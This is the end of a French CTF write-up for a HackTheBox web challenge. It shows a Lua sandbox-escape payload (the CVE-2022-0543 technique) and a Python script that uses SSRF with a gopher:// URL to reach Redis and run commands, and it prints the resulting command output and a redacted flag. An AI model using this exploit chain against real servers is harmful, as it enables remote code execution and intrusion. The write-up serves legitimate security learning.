</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-lua data-lang=lua><span class=line><span class=cl><span class=c1>-- loading &#34;luaopen_io&#34; module from the library to execute a command</span>
</span></span><span class=line><span class=cl><span class=kd>local</span> <span class=n>io_l</span> <span class=o>=</span> <span class=n>package.loadlib</span><span class=p>(</span><span class=s2>&#34;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&#34;</span><span class=p>,</span> <span class=s2>&#34;luaopen_io&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kd>local</span> <span class=n>io</span> <span class=o>=</span> <span class=n>io_l</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=c1>-- executing the command &#39;id&#39;</span>
</span></span><span class=line><span class=cl><span class=kd>local</span> <span class=n>f</span> <span class=o>=</span> <span class=n>io.popen</span><span class=p>(</span><span class=s2>&#34;id&#34;</span><span class=p>,</span> <span class=s2>&#34;r&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=c1>-- reading and returning the output of the command</span>
</span></span><span class=line><span class=cl><span class=kd>local</span> <span class=n>res</span> <span class=o>=</span> <span class=n>f</span><span class=p>:</span><span class=n>read</span><span class=p>(</span><span class=s2>&#34;*a&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>f</span><span class=p>:</span><span class=n>close</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=kr>return</span> <span class=n>res</span>
</span></span></code></pre></td></tr></table></div></div><p>J&rsquo;ai transmis cette <em>charge utile</em> a la command <a class=link href=https://redis.io/docs/latest/commands/eval/ target=_blank rel=noopener>eval</a> du client <em>Redis</em>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>urllib.parse</span> <span class=kn>import</span> <span class=n>quote</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>URL</span> <span class=o>=</span> <span class=s2>&#34;http://&lt;TARGET:HOST&gt;/api/red/generate&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>quote</span><span class=p>(</span><span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>eval &#39;local io_l = package.loadlib(&#34;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&#34;, &#34;luaopen_io&#34;); local io = io_l(); local f = io.popen(&#34;id&#34;, &#34;r&#34;); local res = f:read(&#34;*a&#34;); f:close(); return res&#39; 0
</span></span></span><span class=line><span class=cl><span class=s2>quit
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>input</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;url&#34;</span><span class=p>:</span><span class=sa>f</span><span class=s2>&#34;gopher://&lt;TARGET:HOST&gt;:6379/_</span><span class=si>{</span><span class=n>payload</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>headers</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;User-Agent&#34;</span><span class=p>:</span> <span class=s2>&#34;Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>           <span class=s2>&#34;Content-Type&#34;</span><span class=p>:</span> <span class=s2>&#34;application/json&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>           <span class=s2>&#34;Cookie&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;SESSION_COOKIE&gt;&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>request</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=o>=</span><span class=n>URL</span><span class=p>,</span> <span class=n>json</span><span class=o>=</span><span class=nb>input</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>request</span><span class=o>.</span><span class=n>json</span><span class=p>())</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\\</span><span class=s2>n&#34;</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\\</span><span class=s2>r&#34;</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>))</span>
</span></span></code></pre></td></tr></table></div></div><p>J&rsquo;ai réussi à obtenir la <strong>RCE</strong> sur l&rsquo;hôte.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-zsh data-lang=zsh><span class=line><span class=cl>$ python script.py
</span></span><span class=line><span class=cl><span class=o>{</span><span class=s1>&#39;message&#39;</span>: <span class=s1>&#39;Unknown error occured while fetching the image file: $48
</span></span></span><span class=line><span class=cl><span class=s1>uid=101(redis) gid=101(redis) groups=101(redis)
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>+OK
</span></span></span><span class=line><span class=cl><span class=s1>&#39;</span><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Le flag se trouvait à la <em>racine</em> du système en tant qu&rsquo;exécutable.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-zsh data-lang=zsh><span class=line><span class=cl>$ python script.py
</span></span><span class=line><span class=cl><span class=o>{</span><span class=s1>&#39;message&#39;</span>: <span class=s1>&#39;Unknown error occured while fetching the image file: $32
</span></span></span><span class=line><span class=cl><span class=s1>HTB{&lt;REDACTED&gt;}
</span></span></span><span class=line><span class=cl><span class=s1>+OK
</span></span></span><span class=line><span class=cl><span class=s1>&#39;</span><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=references><a href=#references class=header-anchor></a>References</h2><ul><li><a class=link href=https://www.vaadata.com/blog/fr/comprendre-la-vulnerabilite-web-server-side-request-forgery-1/ target=_blank rel=noopener>https://www.vaadata.com/blog/fr/comprendre-la-vulnerabilite-web-server-side-request-forgery-1/</a></li><li><a class=link href=https://www.vaadata.com/blog/wp-content/uploads/2022/01/SSRF_vulnerabilite_cheat_sheet.pdf target=_blank rel=noopener>https://www.vaadata.com/blog/wp-content/uploads/2022/01/SSRF_vulnerabilite_cheat_sheet.pdf</a></li><li><a class=link href=https://www.npmjs.com/package/node-libcurl target=_blank rel=noopener>https://www.npmjs.com/package/node-libcurl</a></li><li><a class=link href=https://docs.kernel.org/filesystems/proc.html target=_blank rel=noopener>https://docs.kernel.org/filesystems/proc.html</a></li><li><a class=link href=https://redis.io target=_blank rel=noopener>https://redis.io</a></li><li><a class=link href=https://fr.wikipedia.org/wiki/Gopher target=_blank rel=noopener>https://fr.wikipedia.org/wiki/Gopher</a></li><li><a class=link href=https://github.com/vulhub/vulhub/blob/master/redis/CVE-2022-0543/README.md target=_blank rel=noopener>https://github.com/vulhub/vulhub/blob/master/redis/CVE-2022-0543/README.md</a></li><li><a class=link href=https://www.ubercomp.com/posts/2022-01-20_redis_on_debian_rce target=_blank rel=noopener>https://www.ubercomp.com/posts/2022-01-20_redis_on_debian_rce</a></li></ul></section><footer class=article-footer><section class=article-tags><a href=/fr/tags/hackthebox/>HackTheBox</a>
<a href=/fr/tags/challenge/>Challenge</a>
<a href=/fr/tags/web/>Web</a></section><section class=article-lastmod><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<span>Dernière mise à jour le Jun 06, 2024 00:00 UTC</span></section></footer><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css integrity=sha384-n8MVd4RsNIU0tAv4ct0nTaAbDJwPJzDEaqSD1odI+WdtXRGWt2kTvGFasHpSy3SV crossorigin=anonymous><script src=https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js integrity=sha384-XjKyOOlGwcjNTAIQHIpgOno0Hl1YQqzUOEleOLALmuqehneUG+vnGctmUb0ZY0l8 crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js integrity=sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05 crossorigin=anonymous defer></script><script>window.addEventListener("DOMContentLoaded",()=>{renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1},{left:"\\(",right:"\\)",display:!1},{left:"\\[",right:"\\]",display:!0}],ignoredClasses:["gist"]})})</script></article><footer class=site-footer><section class=copyright>&copy;
2024 Wiloti</section><section class=powerby>Background provided by <b><a href=https://backgrnd.site/>backgrnd</a><b><br>Généré avec <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Thème <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.26.0>Stack</a></b> conçu par <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>